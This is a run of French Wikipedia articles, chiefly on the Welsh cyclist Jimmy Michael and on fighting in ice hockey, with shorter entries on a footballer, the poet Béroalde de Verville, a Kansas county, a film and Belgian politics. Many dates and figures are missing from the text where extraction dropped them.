Jimmy Michael mesurait 56. Il est né à Aberaman, Rhondda Cynon Taf au Pays de Galles. Ses parents ont une boucherie dans sa ville de naissance et il commence la pratique du vélo vers 12 ans. Ses premiers succès ont lieu lors des rencontres sportives organisées entre Glynneath et Mountain Ash. Il continue à gagner lors de plus grandes réunions à Cardiff, Newport et Merthyr Tydfil. Il remporte également le championnat gallois organisé sur cinq et 50 miles.
Il participe ensuite à une course (la " Surrey Hundred") sur le vélodrome de Herne Hill. Il remporte la course en 4 h 19 min 39 s avec sept minutes d'avance sur le deuxième. Il bat le record de l'épreuve et sa performance lui offre deux contrats pour participer à des courses à Paris.
Carrière professionnelle.
En 1895, Michael bat le record des au vélodrome de l'Est en 2 h 20 min 25 s 4/5.
Michael devient professionnel en 1895 pour la société de vélos Gladiator, où il rejoint Arthur Linton, un autre coureur de sa ville. Les deux sont entraînés par Choppy Warburton, connu pour utiliser des pratiques se rapprochant du dopage. Michael devient la même année à Cologne champion du monde de demi-fond professionnel et il égale le record de Linton sur 50 kilomètres. Linton étant dans une mauvaise année, leur relation s'est détériorée. Le frère de Linton, Tom ajoute quelques commentaires en 1896, qui poussent Michael à envoyer une lettre à la presse : 
Le match n'a jamais pu avoir lieu. Arthur Linton meurt en juin de cette même année, six semaines après avoir remporté Bordeaux-Paris. La cause officielle du décès est la fièvre typhoïde, mais les observateurs supposent qu'il s'agit plutôt des conséquences du dopage pratiqué par Warburton.
Il se rend aux États-Unis où il amasse des fortunes. Sa fortune augmente régulièrement, jusqu'à francs par an, selon Pierre Chany. Étant aux États-Unis, il manque les championnats du monde de 1896 organisé au Danemark. Un autre historien écrit :
Michael perd presque l'ensemble de sa fortune en 1899 lors de jeu de hasard et en devenant jockey et propriétaire d'une écurie de chevaux de courses, après avoir été convaincu par Fernand Charron, avec qui il était ami. Les années suivantes, il reprend le cyclisme, mais sans obtenir les mêmes résultats. En 1903, lors d'une course à Berlin, il chute à près de et subit des blessures graves à la tête dont il ne se remettra jamais. Après l'accident, il commence à boire en compagnie du coureur franco-suisse Jean Gougoltz. 
Walter Rütt, le champion du monde de sprint en 1913, déclare dans un entretien que Jimmy Michael a commencé à boire en raison d'éternels maux de tête qui ont suivi sa chute à Berlin. En , Michael négocie une dernière série de courses aux États-Unis, qui, il espère vont lui permettre de rétablir sa santé physique et financière. Il meurt le d'un "delirium tremens" dans sa cabine du transatlantique "La Savoie" lors de la traversée. La cause officielle de sa mort est une fièvre causée par la fatigue. En fait, il est plus sûrement mort d'un accident vasculaire cérébral dû à l'alcool. Son ami, le coureur suisse Jean Gougoltz empêche que son corps ne soit jeté à la mer et le fait transporter à ses frais. Il est inhumé au cimetière de Greenwich.
L'artiste français Henri de Toulouse-Lautrec réalise une lithographie du pistard gallois pour servir de publicité à l'entreprise Simpson. Toulouse-Lautrec est un fan de vélo et se rend souvent aux vélodromes de Paris. En 1896, il réalise à Londres des croquis du Gallois avant de les terminer à Paris. Le groupe Simpson rejette finalement le dessin de Lautrec en raison de détails techniques. Néanmoins, 200 exemplaires de l'affiche sont imprimés. Le Musée national du Pays de Galles en achète un exemplaire dans les années 1960.
Michael a été intronisé au Temple de la renommée des sports du pays de Galles.
Il était surnommé « le petit prodige ».

</doc>
<doc id="1873909" url="https://fr.wikipedia.org/wiki?curid=1873909" title="Stanislas Golinski">
Stanislas Golinski

Stanislas Golinski, né le à Montigny-en-Gohelle et mort le à Salon-de-Provence, est un footballeur français.
Mineur de fond dès l'âge de quatorze ans, fils de mineur, Stanislas Golinski fut repéré par le RC Lens où il joua de 1946 à 1948. Puis il devint l'arrière central du Nîmes Olympique, rival du grand Reims, jusqu'en 1958. Connu à Nîmes sous les prénoms de Stan, Stanis, Stanislas, Golinski était un patron de défense athlétique, dur sur l'homme, bon relanceur, "bête noire" du célèbre Gunnar Andersson. Dans l'Équipe magazine numéro 10 du , l'attaquant de l'OM, l'homme aux 100 buts en 100 matchs, dira de Golinski : « Expliquez cela comme vous voudrez, je ne peux pas jouer contre ce garçon, il me paralyse ». En tant qu'entraîneur fédéral Stanislas Golinski mena le FC Annecy au titre de Champion de France CFA en 1960.
En 2022, le magazine "So Foot" le classe dans le top 1000 des meilleurs joueurs du championnat de France, à la .

</doc>
<doc id="1873911" url="https://fr.wikipedia.org/wiki?curid=1873911" title="Béroalde de Verville">
Béroalde de Verville



</doc>
<doc id="1873912" url="https://fr.wikipedia.org/wiki?curid=1873912" title="François Béroalde de Verville">
François Béroalde de Verville

François Béroalde de Verville de son vrai nom François Vatable Brouard, né le à Paris et mort en à Tours, est un poète français, auteur du "Moyen de parvenir".
Biographie.
François Béroalde de Verville était le fils de Mathieu Brouard, dit Béroalde, théologien et écrivain français, et de Marie Bletz, la nièce du théologien François Vatable. Son père avait embrassé le calvinisme. Son enfance se déroule sans faits notables jusqu'en 1562 où, alors que la famille fuit les massacres religieux de Paris, sa mère meurt de la peste. La famille reste en France jusqu'à la Saint Barthélemy, en 1573, avant de fuir pour Genève. Là, Mathieu Béroalde, devenu ministre de l'Évangile, tient une pension où il dispense une éducation à la fois religieuse et humaniste, avec notamment pour élèves Pierre de L'Estoile et Agrippa d’Aubigné. Ce milieu sera très favorable à l'éveil culturel de François Béroalde, qui part ensuite à Bâle où il apprend l’horlogerie et l’orfèvrerie. Il étudie ensuite la médecine, et on suppose que c'est également à cette période de sa vie qu'il s'initie à l'alchimie.
À la mort de son père, le , il décide, à , de retourner à Paris. Renonçant à tout son héritage au profit de ses deux sœurs Anne et Renée, il fréquente alors le cercle de Pierre de l'Estoile, audiencier à la chancellerie, et se convertit au catholicisme. Il publie son premier ouvrage : "Appréhensions spirituelles".
En 1589, il suit Henri III, chassé par la Ligue, dans son exil à Tours. N'ayant plus de mécènes il survit en traduisant des ouvrages dont "La Constance" de Juste Lipse et une partie de "La Diane" de Montemayor. Sa fidélité au roi lui vaut le titre de chanoine de la cathédrale Saint-Gatien le . Sa sécurité financière étant assurée, il va commencer à produire la majorité de son œuvre. En 1600, il écrit la "Serodokimasie", à la demande du roi Henri IV, et devient très proche du cercle des médecins paracelsiens qui l'entourent.
Il écrit ensuite plusieurs ouvrages, dont le plus connu reste en 1617 "Le Moyen de parvenir", avant de décéder en octobre 1626.
Alchimiste ?
Selon Claude Gagnon, il serait l'auteur du livre alchimique attribué à Nicolas Flamel, le "Livre des figures hiéroglyphiques". Ce dernier texte, essentiel dans l'histoire de l'alchimie, ne daterait pas de 1399, mais de 1590 environ, vu son style. 
Œuvres.
"Le Moyen de parvenir" (1616).
Le plus connu des ouvrages de François Béroalde est " Le Moyen de parvenir", imprimé sous le titre de "Salmigondis", ainsi que sous celui de "Coupe-cu de la Mélancolie", ou "Vénus en belle humeur".
Autres œuvres.
La plupart ont été réunies sous le titre d"'Appréhensions spirituelles", Paris, Timoth. Jouan, 1585, in-12.
Béroalde de Verville a laissé des ouvrages variés : des romans, des traités de morale et de philosophie, des mélanges, un traité sur les vers à soie et de la poésie. Ses "Souspirs amoureux" témoignent de son talent de poète.
On trouvera une liste assez exacte des autres écrits de Béroalde dans le t. 54 des "Mémoires" de Jean-Pierre Niceron.
Son testament mentionne un ouvrage jamais publié nommé "De la physique" et qui est aujourd'hui perdu.
La Croix du Maine lui attribue également deux tragédies françaises sans en indiquer le sujet.
Éditions modernes.
"Le Moyen de parvenir", éd. Léon Willem, 1870-1872 

</doc>
<doc id="1873918" url="https://fr.wikipedia.org/wiki?curid=1873918" title="Comté de Barber">
Comté de Barber

Le comté de Barber est l’un des 105 comtés de l’État du Kansas, aux États-Unis, à la frontière avec l’Oklahoma. Fondé le , il a été nommé en hommage à Thomas W. Barber, assassiné lors de troubles politiques à Lawrence en 1855.
Siège et plus grande ville : Medicine Lodge.
Anecdote.
Le comté a été fondé de manière erronée sous le nom de « comté de Barbour », erreur rectifiée en 1883.

</doc>
<doc id="1873919" url="https://fr.wikipedia.org/wiki?curid=1873919" title="Pierre Billard">
Pierre Billard

Pierre Billard peut désigner :

</doc>
<doc id="1873926" url="https://fr.wikipedia.org/wiki?curid=1873926" title="Melek Taus">
Melek Taus



</doc>
<doc id="1873932" url="https://fr.wikipedia.org/wiki?curid=1873932" title="Minorité culturelle">
Minorité culturelle



</doc>
<doc id="1873941" url="https://fr.wikipedia.org/wiki?curid=1873941" title="Culture minoritaire">
Culture minoritaire



</doc>
<doc id="1873942" url="https://fr.wikipedia.org/wiki?curid=1873942" title="Alfred Hamerlinck">
Alfred Hamerlinck

Alfred Hamerlinck, né le à Assenede (Flandre-Orientale) et mort le à Gand, est un coureur cycliste belge.
Biographie.
Il remporte 82 victoires au cours de sa carrière professionnelle. Spécialiste des courses de kermesse, il remporte notamment la première étape du Tour de France 1931.
En 1931, il apparait dans son propre rôle dans le film Hardi les gars ! réalisé par Maurice Champreux.

</doc>
<doc id="1873943" url="https://fr.wikipedia.org/wiki?curid=1873943" title="L'Étrange Nuit de Noël">
L'Étrange Nuit de Noël

 
L'Étrange Nuit de Noël est un film français réalisé par Yvan Noé sorti en 1939.
Synopsis.
Avec la complicité des domestiques, André et Raymond invitent leurs amis la veille de Noël dans la villa de leur oncle qu'ils pensent être parti à la chasse, mais celui-ci rentre chez lui pour les surprendre.

</doc>
<doc id="1873946" url="https://fr.wikipedia.org/wiki?curid=1873946" title="Death Wish">
Death Wish



</doc>
<doc id="1873948" url="https://fr.wikipedia.org/wiki?curid=1873948" title="Mars Inc">
Mars Inc



</doc>
<doc id="1873950" url="https://fr.wikipedia.org/wiki?curid=1873950" title="Rassemblement des progressistes">
Rassemblement des progressistes

Le Rassemblement des progressistes fut un thème récurrent de la vie politique belge et wallonne de 1945 à la fin du . Elle fut d'abord le but d'André Renard dès la création du Mouvement syndical unifié au lendemain de la Libération et de l'UDB. Elle correspond aussi à la pratique toujours d'actualité de ce que l'on appelle le Front commun syndical réunissant la FGTB et la CSC après la Grève générale de l'hiver 1960-1961. Au cours des années 1960 le Mouvement ouvrier chrétien (avec des gens comme Germain Capelleman et Max Bastin) puis le PSB de Léo Collard en émirent également le vœu. Dans les milieux intellectuels, "La Revue Nouvelle" s'était engagée dans le même sens dès 1966. C'est dans ce contexte que le groupe Max Bastin-Jacques Yerna réunissant des militants des deux bords publia plusieurs ouvrages programmatiques dont le plus connu reste "Quelle Wallonie? Quel socialisme?" (1971).
C'est à Mons que, sur le plan local et électoral, cette idée recueillit le succès le plus fort et le plus significatif: près de 28 % aux élections communales de et un rassemblement allant jusqu'aux communistes, aux chrétiens, aux socialistes, à certains éléments de l'extrême-gauche. Lorsque le Rassemblement wallon effectua son "tournant à gauche" de , l'entreprise fut également dépeinte comme inspirée du même rêve de la gauche wallonne. Effectivement, les socialistes et le Rassemblement wallon déposèrent des listes communes aux élections législatives de 1977 dans le Luxembourg. Quand le Rassemblement populaire wallon se créa en 1981, il s'allia aux socialistes de Guy Spitaels (sous le nom de "Rassemblement des progressistes et socialistes wallons") qui lui-même pratiqua une politique de rassemblement dans la Ville d'Ath dont il fut longtemps bourgmestre. Au total cette idée fut effective surtout sur le plan syndical. Elle n'est pas entièrement morte aujourd'hui et certaines coalitions électorales, au moins au plan communal qu'on appelle "L'Olivier" (nom d'inspiration italienne), ont toujours cours. Le ralliement de certaines personnalités chrétiennes au PS comme François Martou aux élections de est un peu plus qu'une réminiscence de ce projet qui travailla la gauche en Wallonie pendant plus d'un demi-siècle.

</doc>
<doc id="1873951" url="https://fr.wikipedia.org/wiki?curid=1873951" title="Bothricéphales">
Bothricéphales



</doc>
<doc id="1873953" url="https://fr.wikipedia.org/wiki?curid=1873953" title="Megas">
Megas

Megas (de son vrai nom Magnús Þór Jónsson, né le à Reykjavik, Islande) est un chanteur, auteur-compositeur et écrivain islandais.

</doc>
<doc id="1873955" url="https://fr.wikipedia.org/wiki?curid=1873955" title="Episcopus vagans">
Episcopus vagans



</doc>
<doc id="1873956" url="https://fr.wikipedia.org/wiki?curid=1873956" title="Combat au hockey sur glace">
Combat au hockey sur glace

En hockey sur glace, les combats entre deux joueurs ou plus sont monnaie courante dans certaines ligues, particulièrement en Amérique du Nord. Certains joueurs, les « policiers », sont spécialisés dans les combats et interviennent dans les moments cruciaux pour une équipe afin d'essayer de faire basculer le match. Leur intervention peut également survenir afin de protéger la vedette de l'équipe. Ces joueurs spéciaux de l'équipe ont souvent un temps de jeu limité, compensant une technique moindre par leur impact physique sur l'adversaire.
Même si les combats au hockey sont de moins en moins courants, et que certains considèrent ce comportement brutal comme un frein à la promotion de ce sport et un comportement inadapté, un combat entre deux joueurs reste pour certains partisans un moment attendu lors d'un match et bien souvent les médias s'en font l'écho.
Historique.
Historiquement, le hockey a toujours été lié à des combats entre joueurs, même au Canada du début du , le Canada étant la base du développement du jeu moderne. Une des raisons est qu'à l'époque, les règles du hockey n'étant pas réellement définies, certains abus pouvaient être commis et il n'était pas rare de voir un joueur d'une équipe en intimider un autre.
En 1918, la Ligue nationale de hockey introduit une nouvelle règle : la ligne bleue. Cette ligne va permettre aux joueurs de faire des passes vers l'avant — auparavant, ils jouaient sur des règles similaires à celles du rugby avec l'interdiction de la passe en avant. Cependant, ces passes sont alors uniquement autorisées dans la zone neutre (entre les deux lignes bleues) et dans toutes les zones de la patinoire, celui qui possédait le palet (ou rondelle) était sans interruption soumis à la pression physique adverse. Ainsi, un nouveau rôle non officiel de joueur fait rapidement ses débuts, le « policier », avec pour mission de protéger la vedette de son équipe qui manie le palet.
En 1922, la LNH introduit une nouvelle règle dans son règlement, la règle 56 qui autorise officiellement les combats entre joueurs. La LNH parle alors de « ». Alors qu'à l'époque, lors des matchs de hockey universitaire ou même dans les circuits amateurs, les combattants sont tous deux exclus directement du match, la LNH introduit la notion d'acceptabilité en infligeant cinq minutes de pénalités aux belligérants. Cette règle 56 fera par la suite son chemin au sein des ligues mineures. Certains commencent déjà à mettre en avant les combats du hockey pour promouvoir le sport : c'est le cas par exemple de Tex Rickard, du Madison Square Garden, promoteur de hockey mais également de boxe qui, voyant là une aubaine, va faire enfler les affaires entre différents policiers de franchises dites rivales.
Cette fameuse règle 56 est maintenant reprise dans le livre de règles de la LNH sous le numéro 46 et le terme désuet de « » est désormais absent. Les arbitres ont également beaucoup de latitude pour donner des pénalités plus hautes que les cinq minutes classiques du passé.
Même si entre les années 1920 et les années 1960, les combats dans la LNH étaient beaucoup moins nombreux qu'aujourd'hui, ils étaient tout de même bien souvent beaucoup plus violents, voire dangereux pour une équipe. Les policiers étaient alors rares et souvent les joueurs vedettes n'avaient pas d'autre choix que de se défendre eux-mêmes : avec seulement six franchises dans la LNH, les places des joueurs au sein des effectifs étaient assez rudes à obtenir et les joueurs avec moins de technique que d'agressivité ne parvenaient pas à se faire leur place.
En 1967, la LNH décide de doubler le nombre de franchises. Elle organise une sélection spéciale de joueurs pour les équipes ainsi créées et un nombre important de policiers va pouvoir évoluer dans la LNH. Au cours des années 1980, le nombre de combats est supérieur à un par match et de nombreuses franchises vont recruter des policiers pour protéger leurs joueurs vedettes : c’est ainsi le cas de Dave Semenko et de Marty McSorley pour Wayne Gretzky, ou encore de Stu Grimson protecteur de Paul Kariya des Mighty Ducks d'Anaheim.
Malgré tout, depuis les années 1970, trois règles de la LNH ont contribué à diminuer le nombre de combats lors d’un match :
Règles et punitions.
Le combat est une pratique illégale aussi bien dans la Ligue nationale de hockey que dans les ligues juniors d’Amérique du Nord ou même dans n’importe quelle ligue professionnelle mineure nord-américaine. Mais la différence principale entre ces ligues et d'autres ligues — comme les ligues européennes par exemple — ou même d'autres sports, réside dans le fait que les arbitres n'excluent pas du match un joueur ayant participé à un combat.
C’est tout de même le cas dans les ligues des plus jeunes, dans le championnat universitaire mais également dans les championnats Élites européens, dans les compétitions des Jeux olympiques d'hiver. Enfin, dans le hockey sur glace féminin, quel que soit le niveau, les combattantes sont exclues du match.
Le livre de règles de la LNH précise tout de même que pour qu’un combat se passe entre joueurs, certains points doivent être respectés. Le premier point étant que les deux joueurs doivent jeter leur crosse afin de ne pas s’en servir comme armes. Ils doivent également jeter leurs gants afin de se battre à mains nues. C’est une manière détournée de jeter le gant sur l’adversaire mais s'explique également par souci de sécurité pour les joueurs. Les gants de hockey étant renforcés de cuir et de parties plastiques, les dommages sur les combattants ne pourraient être que pires. La dernière règle est que les joueurs doivent écouter les consignes de l’arbitre quand celui-ci indique qu’un combat est fini. En cas de manquement à un de ces points, les joueurs sont susceptibles d’être punis d’une exclusion de match avec de possibles suspensions ultérieures.
Dans une majorité de ligues, les arbitres tolèrent une bagarre entre deux joueurs tant que ceux-ci tiennent sur leurs patins. Une fois un genou posé sur la glace, les arbitres vont se précipiter pour séparer les adversaires. À l’inverse, les arbitres essaient le plus souvent d’éviter d’avoir un combat entre plus de deux personnes ou même d’avoir plusieurs combats entre deux joueurs en même temps.
Les ligues nord-américaines.
Que ce soit dans la LNH, dans la Ligue américaine de hockey, dans l’ECHL, dans la Ligue centrale de hockey, dans la Ligue internationale de hockey, ou dans une autre ligue mineure, les officiels ont pour consigne de punir de cinq minutes de pénalités les joueurs coupables — la phrase de rigueur étant « "" ».
Plusieurs cas de pénalités supérieures peuvent malgré tout se présenter : si le joueur veut venir sur la glace de la patinoire alors que sa ligne ne jouait pas ou si un joueur utilise une arme de n’importe quel genre – un patin de hockey par exemple, le joueur pourra être directement exclu du match. L’entraîneur ayant laissé un joueur de son banc se présenter sur la glace lors d’un combat encourt une suspension de banc allant jusqu’à dix matchs.
Enfin, un joueur qui reçoit deux fois deux minutes en tant qu’instigateur du combat ou participe à trois combats est immédiatement exclu du match et son équipe jouera en infériorité numérique pendant cinq minutes. Les joueurs exclus sont également sanctionnés financièrement par la ligue.
Depuis 2003, dans l’ECHL, l’instigateur d’un combat lors des cinq dernières minutes d’un match ou au cours des prolongations est immédiatement exclu du match, peine assortie d’une amende et d’une suspension d’un match. À la suite des bons résultats de cette règle, la LNH et la LAH l’ont adopté en 2005-06 et la LNH a même été jusqu’à mettre en place une amende pour l’entraîneur du joueur instigateur du combat.
Autres championnats.
Dans le championnat universitaire (NCAA), les combats sont rares en raison du règlement sévère. En effet, les combattants sont exclus du match et se voient punis d'un ou plusieurs matchs de suspension. La particularité vient du nombre de matchs de suspension : si le joueur impliqué a déjà été exclu lors d’un match de la même saison pour un combat, il sera d’autant plus suspendu. À la première exclusion, il rate un match, à la seconde deux et ainsi de suite.
En ce qui concerne les compétitions européennes et les Jeux Olympiques, ces compétitions sont régies par la Fédération internationale de hockey sur glace qui spécifie au paragraphe 528, les sanctions suivantes :
Les « policiers ».
Le rôle d’un « policier » (en anglais : enforcer) au sein d’une équipe de hockey n’est pas officiel mais peut être déterminant pour une équipe. Ainsi, un policier n’est pas obligatoirement affecté à une ligne en particulier et peut entrer en jeu à tout moment de la partie sur la volonté de son entraîneur afin de soit mettre la pression sur l’adversaire soit de montrer sa présence au policier de l’équipe adverse.
Il se doit de réagir rapidement afin de ne pas laisser la (ou les) vedette(s) intimidée(s) par l'adversaire. Il ne faut toutefois pas confondre un policier avec un type de joueur dit « peste ». Alors qu'une « peste » fait tout pour déstabiliser le match et l'adversaire, le policier est là pour marquer sa présence et montrer qu'il saura répondre si un défi physique est lancé.
Un policier n'est pas nécessairement quelqu'un qui se bat beaucoup. Ainsi Clark Gillies était dans ses premières années un joueur qui se battait beaucoup mais par la suite, ses bagarres ont diminué en raison d'une certaine aura dont il jouissait.
Dans la LNH, le rôle de policier va en diminuant ces dernières années avec la volonté des dirigeants d'augmenter la vitesse du jeu et le nombre de buts. Ainsi, les entraîneurs font parfois le choix de prendre un joueur plus complet à la place du policier au sein de l'effectif. Cela pousse également les policiers à devenir meilleurs dans les autres compartiments du jeu.
Justifications d’un combat.
Il existe dans un match de hockey de nombreuses raisons pour le démarrage d’un combat. Elles peuvent être soit des raisons collectives d’équipes liées directement au match soit des histoires personnelles entre joueurs.
Raisons collectives.
La première raison d’équipe est la revanche et l’intimidation. Ainsi, quand le jeu développé par une équipe ne correspond pas à celui que souhaiterait développer l’adversaire, le policier pourra être envoyé sur la glace par son entraîneur pour déclencher un combat et tenter de changer le cours du match.
Les policiers peuvent également déclencher un combat lors d’un match quand ils sentent que leur équipe perd pied ; ils essaient ainsi de créer un choc psychologique sur l’autre équipe. Ces combats concernent souvent deux policiers, mais le policier d’une équipe peut également choisir comme cible du combat un joueur particulièrement en vue et en forme dans l’équipe adverse. Ce type de combat a d’autant plus d’effet quand l’équipe joue à domicile et fait chavirer les supporters créant une ambiance particulière sur la suite du match. Malgré tout, l’avantage psychologique peut se retourner vers l’autre équipe. Dans les années 1970, les Flyers de Philadelphie portaient le surnom de « "" » et étaient réputés pour leur style de jeu brutal et violent.
L’intimidation est un facteur très important dans le monde du hockey et un joueur – ou un policier – pourra chercher à déclencher un combat uniquement pour montrer qu’il n’a pas peur de « tomber les gants » et de se battre. Ainsi, dans les années 1950, Gordie Howe, jeune joueur, réussit à prendre le dessus sur Lou Fontinato, policier connu du circuit et accumulant près de de pénalités au cours de sa carrière. À la suite de cet incident, Howe fut beaucoup plus libre de ses mouvements lors des matchs et inscrivit un grand nombre de buts inspirant de prime abord un sentiment de crainte à ses adversaires. Paradoxalement, en Europe, alors que les combats entre joueurs sont formellement interdits, les joueurs ne se sentent pas en « danger » et se permettraient plus de coups en douce selon les défenseurs des combats.
Une autre cause possible pour un départ de combat est le score du match. Quand une équipe est menée au score assez sévèrement et doit rencontrer la même équipe quelques jours plus tard, il n’est pas rare de voir des combats éclater à la fin du match, l’équipe menée tentant d'intimider l'adversaire pour le prochain match. Les policiers de l’équipe battue ont également pour tendance de cibler les meilleurs joueurs adverses dans le but de les faire réagir et de leur faire perdre leur sang-froid.
Une des dernières raisons d’équipe est donc la protection du joueur clé de l’équipe, protection que l’on a pu voir dans la LNH lorsque Wayne Gretzky commença sa carrière et que l’on voit également actuellement en 2007 avec l’arrivée de Gary Roberts au sein des Penguins de Pittsburgh pour protéger Sidney Crosby.
Raisons personnelles.
Beaucoup de jeunes policiers doivent prouver à leur dirigeant qu’ils ont fait le bon choix et ce rapidement dans leur carrière. Ainsi, un policier évoluant dans la LAH, à qui on donne une chance de jouer dans la LNH cherchera à montrer par tous les moyens aux dirigeants mais aussi aux supporters et à ses coéquipiers, que les dirigeants ont fait le bon choix en lui confiant le rôle de policier de l’équipe.
Il existe également des rivalités historiques entre la plupart des franchises mais aussi un passif entre certains joueurs des différentes équipes. Ce passé fait souvent ressortir des rancœurs se réglant — ou s’autoalimentant — sur la glace. Ainsi, dans la LNH, les années 1990 furent marquées par une grosse rivalité entre les Red Wings de Détroit et l’Avalanche du Colorado.
Avenir des combats.
Des efforts pour bannir les combats.
Les critiques autour de la violence des combats au hockey sont cycliques et ressortent souvent à l'occasion d'une affaire grave. Ainsi, en 2007, le combat entre Colton Orr des Rangers de New York et Todd Fedoruk des Flyers de Philadelphie a largement été médiatisé et analysé. Le combat ne dura que très peu de temps mais après deux premiers coups, Orr en porta un troisième plus puissant qui mit Fedoruk inconscient.
En dépit des risques physiques, la majorité des joueurs et de l'administration des ligues nord-américaines de hockey insistent sur le fait que le combat fait partie d'un match. Ainsi, à la suite de ce nouvel incident le commissaire de la LNH, Gary Bettman a réaffirmé que la Ligue nationale de hockey n'allait pas débattre sur la question de savoir si les combats avaient leur place ou pas dans la LNH mais a tout de même admis qu'il fallait trouver un moyen de mieux protéger les joueurs.
Malgré cette position officielle de la direction de la LNH, des journalistes sportifs se sont penchés sur la question de savoir quelle était réellement la valeur ajoutée du combat pour un match de hockey, se demandant si les combats ne ternissaient pas plus l'image du sport qu'autre chose ; les arguments avancés étant le clair manquement à un quelconque comportement sportif, le côté brutal qui tranchait avec les sensations de vitesse du hockey et que, finalement, un combat n'était qu'une pure perte de temps.
Les opposants aux combats au hockey se basent sur des comparaisons de matchs internationaux ou même universitaires, qui ne sont pas plus désagréables à regarder, ne sont pas plus gênés par les coups en douce et s'interrogent sur les raisons profondes qu'ont les autorités du hockey de continuer à autoriser les combats.
L'engouement populaire autour des combats.
Un certain engouement entoure tout de même les combats de hockey. Dans le milieu musical et culturel, de nombreux artistes font références au combat de hockey et ainsi, par exemple, le nom du groupe rock américain ' est une référence à la pénalité du hockey et a été choisi par le chanteur John Ondrasik, qui est un grand amateur de hockey sur glace. Le groupe hardcore de Los Angeles ' tire son nom d’un terme d’argot désignant un combat entre les joueurs pendant une partie de hockey.
Il peut arriver que les gardiens se mêlent à la bagarre, ce qui a toujours pour conséquence de ravir les fans. Bien souvent, cela arrive quand une bagarre générale se déclenche et les gardiens s'opposent l'un à l'autre.
Ce phénomène est rare car cela veut dire que le gardien remplaçant doit alors faire ses débuts au cours du match.
Certains jeux vidéo incluent dans leur ' des phases simulant ces scènes en reprenant les codes du jeu de combat, par exemple dans ' ou encore la série NHL d'EA Sports qui incluent ces combats.
Impacts sur la santé des joueurs.
Outre le fait que les bagarres au hockey sur glace peuvent possiblement ternir l’image du sport, il est important de mentionner que ces dernières affectent grandement la santé de nombreux joueurs. En effet, l’accumulation de coups à la tête provenant de bagarres a provoqué des conséquences néfastes pour de nombreux hockeyeurs, incluant notamment les commotions cérébrales, aussi appelé traumatisme crânien. Il ne faut pas oublier non plus que les commotions cérébrales ont un effet cumulatif, c’est-à-dire que la suivante est plus dommageable que la précédente, et ainsi de suite. De plus, les effets à long terme sont à souligner, car ils peuvent être aussi dévastateurs que ses effets immédiats. Parmi ceux-ci, on compte notamment, les sauts d’humeur, l’anxiété, les troubles d’organisation et de gestion, les troubles de la mémoire et de l’attention sans parler des maux de tête et des étourdissements qui se voient apparaître très fréquemment. Une étude ayant été publiée dans une revue médicale spécialisée souligne d’ailleurs les impacts de ces commotions non seulement sur la santé des joueurs, mais sur la longévité de leur carrière dans la LNH (Ligue nationale de hockey). En effet, les auteurs ont comparé deux groupes de hockeyeurs, un composé de joueurs commotionnés et l’autre ayant évité ce type de blessure. On constate à travers leurs résultats qu’un joueur ayant subi une grave commotion à de moins en moins de chance, au fil des années, de garder son poste dans la LNH, puisque sa performance se dégrade. En fait, la carrière des joueurs ayant développé ce type de problème se termine en moyenne 2,1 saisons après leur blessure. Il en est de même pour les gardiens de but qui se voit, en moyenne, accorder 19,3 buts de plus à la suite d'une commotion. L’étude souligne également que les commotions cérébrales résultent, en grande partie, des bagarres qui se voient beaucoup trop fréquentes entre les joueurs. Bref, le hockey sur glace se trouve à être le sport dans lequel on compte la plus grande incidence de commotions cérébrales. Les professionnels qui ont comme intérêt premier la santé et la sécurité des joueurs s’entendent tous sur le même point: l’abolition des bagarres est la première chose à faire. 
Le combat à proprement parler.
Étiquette.
Malgré le côté violent et spontané qu'un combat représente au cours d'un match, il existe certaines règles qui, même si elles ne sont pas discutées par les joueurs, sont majoritairement bien appliquées par tout le monde. Le point le plus important est que les policiers ne se battent que quand ils sont tous les deux d'accord et qu'ils se montrent cet accord — par l'intermédiaire d'une parole ou d'un geste par exemple. Cet accord tacite fait que le combat semble réellement éclater d'un seul coup, empêchant un des deux belligérants de recevoir deux minutes de pénalités supplémentaires en tant qu'instigateur du combat.
Il est également rare de voir un policier s'en prendre à un autre joueur non connu pour être lui-même un policier. Ainsi, chaque policier établit petit à petit sur chacun de ses adversaires potentiels une sorte de carte d'identité sur les autres policiers avec leurs faiblesses et techniques connues.
Malgré tout, il existe un grand respect entre les différents policiers et leur code moral leur interdit de se battre contre un adversaire déjà diminué ou blessé. Ainsi, il est souvent malvenu de vouloir combattre contre un policier qui va bientôt sortir de la glace ou même en fin de match.
Un des derniers aspect de l'étiquette est de savoir se battre proprement, c'est-à-dire sans se servir d'« armes » (casques, gants, …) et en ne tirant pas sur le maillot de l'autre pour l'aveugler. Le respect d'un policier viendra autant du résultats des combats que de la manière dont il se bat et de l'image qu'il renvoie.
Tactiques de combat.
Il existe des tactiques de combats permettant aux policiers de prendre le dessus sur un adversaire. Une des tactiques souvent adoptée est connue sous le nom anglais de « » consistant à baisser la tête et à donner autant de coups de poing qu'il le peut et aussi vite que possible. Cette tactique a pour inconvénient que le combattant prend souvent autant de coups qu'il n'en donne. Elle nécessite donc de savoir encaisser les coups.
Les combattants ont également pour habitude de tenir leur adversaire d'une main afin de garder leur équilibre sur la glace. Ainsi, la majorité des combats ressemble à deux joueurs se tenant d'une main et se tapant de l'autre.
Certains policiers, comme Darren McCarty, ont tendance à laisser leur adversaire leur donner quelques coups avant de répliquer plus durement, affirmant que la différence lors d'un combat ne se fait pas dans le nombre de coups donnés mais dans le nombre de coups reçus.
Gordie Howe avait quant à lui pour habitude de tenir son adversaire du côté de son « bon » poing afin de le gêner le plus possible. Bob Probert des Red Wings de Détroit était connu pour laisser son adversaire le frapper jusqu'à ce que ce dernier soit fatigué et ensuite seulement il commençait à frapper causant de plus grands dégâts.
Certains ont également comme tactique de tirer fort sur le maillot adverse dans l'espoir de le retirer à moitié et ainsi de masquer la vue de leur adversaire. À l'inverse, comme Rob Ray, certains ont pour habitude de s'enlever eux-mêmes leur maillot au début d'un combat afin de n'offrir aucune prise à l'adversaire.
Combats célèbres.
Certains combats ont plus particulièrement attiré l'attention des médias en raison soit des blessures occasionnées, soit des circonstances exceptionnelles.
Ainsi lors des séries éliminatoires de 1984, le , un match de second tour entre les Nordiques de Québec et les Canadiens de Montréal se transforme en une sorte de pugilat géant à la fin de seconde période après de nombreux accrochages et des nombreux combats individuels. Une fois le calme revenu, la pause est sifflée. Mais avant le début du troisième tiers-temps, une nouvelle mêlée oppose les deux équipes à l'annonce des pénalités. Un total de de pénalité et de matchs pour mauvaises conduites sont distribuées. Ce dernier match, surnommé la "bataille du Vendredi saint", provoque le départ à la retraite de l'arbitre Bruce Hood une fois les séries finies.
